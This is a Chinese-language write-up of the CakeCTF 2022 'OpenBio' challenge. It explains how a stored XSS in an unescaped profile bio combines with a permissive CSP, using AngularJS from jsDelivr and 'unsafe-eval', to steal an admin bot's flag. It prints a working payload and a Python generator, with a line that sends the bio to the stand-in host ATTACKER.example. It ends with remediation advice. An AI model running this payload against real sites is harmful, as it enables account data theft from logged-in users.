# CakeCTF 2022 OpenBio Writeup

## 题目简述

用户可以把任意 HTML 保存到个人简介，个人资料页使用 `{{ bio|safe }}` 原样渲染。举报后，管理员机器人会注册一个临时账号，把 flag 写入自己的 bio，再以登录状态访问被举报者的资料页。

页面设置了 CSP，Cookie 也可由 Flask 配置为 HttpOnly。题目要点是：HttpOnly 只阻止 JavaScript 读取 Cookie 字符串，并不会阻止同源脚本携带 Cookie 发请求；CSP 又允许从 jsDelivr 加载脚本并启用了 `'unsafe-eval'`，可以借 AngularJS 执行存储型 XSS。

## 解题过程

### CSP 可利用面

关键策略包括：

```text
script-src
  https://cdn.jsdelivr.net/
  https://www.google.com/recaptcha/
  https://www.gstatic.com/recaptcha/
  'unsafe-eval'
```

攻击者不能直接执行没有 nonce 的内联 `<script>`，但可以从允许的 jsDelivr 域加载 AngularJS。Angular 表达式再借 `$eval.constructor` 创建函数；`'unsafe-eval'` 允许这一步执行字符串代码。

模板如下：

```html
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
<div ng-app ng-csp>
  {{$eval.constructor('eval(atob("BASE64_PAYLOAD"))')()}}
</div>
```

### 读取管理员自己的 bio

机器人访问攻击者资料时，浏览器中仍保留机器人账号的会话。XSS 向 `/` 发同源 GET，请求自动携带 HttpOnly 会话 Cookie。首页会把当前用户的 bio 放进 `<textarea id="bio">`，其中正是机器人刚写入的 flag。

`connect-src 'self'` 会限制跨域 XHR，因此官方 payload 使用顶层页面跳转把 Base64 数据带到攻击者服务器：

```javascript
$(document).ready(function() {
  $.get('/', function(data) {
    const match = /<textarea class.+>(.*)<\/textarea>/g.exec(data);
    const bio = match[1];
    if (bio.indexOf('flag') !== -1) {
      location.href = 'http://ATTACKER.example:18002/?x=' + btoa(bio);
    }
  });
});
```

生成最终简介内容：

```python
import base64

javascript = b"""
$(document).ready(function() {
  $.get('/', function(data) {
    const match = /<textarea class.+>(.*)<\\/textarea>/g.exec(data);
    const bio = match[1];
    if (bio.indexOf('flag') !== -1) {
      location.href = 'http://ATTACKER.example:18002/?x=' + btoa(bio);
    }
  });
});
"""

template = """
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('eval(atob("PAYLOAD"))')()}}</div>
"""

bio = template.replace(
    "PAYLOAD",
    base64.b64encode(javascript).decode(),
)
print(bio)
```

把生成内容保存为自己的 bio，提交举报并等待机器人访问。攻击者服务器收到 `x` 参数后 Base64 解码，即可看到：

```text
CakeCTF{httponly=true_d03s_n0t_pr0t3ct_U_1n_m4ny_c4s3s!}
```

## 方法总结

完整链条是：未过滤的 bio 形成存储型 HTML 注入、CSP 信任可控 CDN 脚本且开放 `unsafe-eval`、Angular 表达式转为 JavaScript、同源请求读取机器人资料、页面导航完成跨域外带。

HttpOnly 保护的是 Cookie 值本身，不是带 Cookie 的请求和同源响应。修复应先对 bio 做严格 HTML 清洗或纯文本转义，同时收紧 CSP：避免宽泛 CDN 源和 `unsafe-eval`，并让管理员机器人使用最小权限、独立敏感数据通道。
